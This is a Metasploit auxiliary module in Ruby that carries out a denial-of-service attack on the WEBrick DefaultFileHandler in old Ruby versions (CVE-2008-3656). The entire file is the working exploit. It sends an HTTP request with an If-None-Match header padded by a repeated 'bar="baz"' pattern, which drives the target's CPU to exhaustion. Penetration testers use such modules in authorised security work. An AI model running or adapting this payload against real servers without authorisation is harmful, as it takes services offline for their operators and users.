##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ruby WEBrick::HTTP::DefaultFileHandler DoS',
        'Description' => %q{
          The WEBrick::HTTP::DefaultFileHandler in WEBrick in
          Ruby 1.8.5 and earlier, 1.8.6 to 1.8.6-p286, 1.8.7
          to 1.8.7-p71, and 1.9 to r18423 allows for a DoS
          (CPU consumption) via a crafted HTTP request.
        },
        'Author' => 'kris katterjohn',
        'License' => MSF_LICENSE,
        'References' => [
          [ 'BID', '30644'],
          [ 'CVE', '2008-3656'],
          [ 'OSVDB', '47471' ],
          [ 'URL', 'http://www.ruby-lang.org/en/news/2008/08/08/multiple-vulnerabilities-in-ruby/']
        ],
        'DisclosureDate' => '2008-08-08',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('URI', [ true, 'URI to request', '/' ])
    ])
  end

  def run
    o = {
      'uri' => normalize_uri(datastore['URI']),
      'headers' => {
        'If-None-Match' => %q{foo=""} + %q{bar="baz" } * 100
      }
    }

    c = connect(o)
    c.send_request(c.request_raw(o))

    print_status("Request sent to #{rhost}:#{rport}")
  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    print_status("Couldn't connect to #{rhost}:#{rport}")
  rescue ::Timeout::Error, ::Errno::EPIPE => e
    vprint_error(e.message)
  end
end
